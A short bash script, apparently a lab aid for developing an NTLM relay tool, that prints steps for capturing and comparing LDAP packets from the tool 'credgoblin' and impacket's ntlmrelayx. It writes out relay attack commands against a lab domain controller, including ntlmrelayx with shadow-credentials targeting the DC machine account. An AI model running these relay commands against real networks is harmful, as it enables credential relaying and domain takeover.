#!/bin/bash

# Script to capture LDAP packets for comparison between credgoblin and ntlmrelayx

DC_IP="192.168.90.10"
LDAP_PORT="389"

echo "=== LDAP Packet Capture Test ==="
echo "This will capture packets from both credgoblin and ntlmrelayx for comparison"
echo ""

# Test 1: Capture credgoblin packets
echo "[1/2] Capturing credgoblin LDAP packets..."
echo "Run this in terminal 1:"
echo "  sudo tcpdump -i any -s 0 -w /tmp/credgoblin_ldap.pcap 'host $DC_IP and port $LDAP_PORT'"
echo ""
echo "Then run credgoblin test in terminal 2:"
echo "  ./credgoblin -relay ldap://$DC_IP -smb 10.1.1.99"
echo ""
echo "Press Enter when capture is complete..."
read

# Test 2: Capture ntlmrelayx packets
echo ""
echo "[2/2] Capturing ntlmrelayx LDAP packets..."
echo "Run this in terminal 1:"
echo "  sudo tcpdump -i any -s 0 -w /tmp/ntlmrelayx_ldap.pcap 'host $DC_IP and port $LDAP_PORT'"
echo ""
echo "Then run ntlmrelayx test in terminal 2:"
echo "  python3 impacket/examples/ntlmrelayx.py -t ldap://$DC_IP --no-dump --no-da --no-acl --no-validate-privs --shadow-credentials --shadow-target 'DC01$' -smb2support"
echo ""
echo "Press Enter when capture is complete..."
read

echo ""
echo "=== Analysis Instructions ==="
echo "Compare the captures using:"
echo "  tshark -r /tmp/credgoblin_ldap.pcap -V"
echo "  tshark -r /tmp/ntlmrelayx_ldap.pcap -V"
echo ""
echo "Or examine raw bytes:"
echo "  tshark -r /tmp/credgoblin_ldap.pcap -x"
echo "  tshark -r /tmp/ntlmrelayx_ldap.pcap -x"
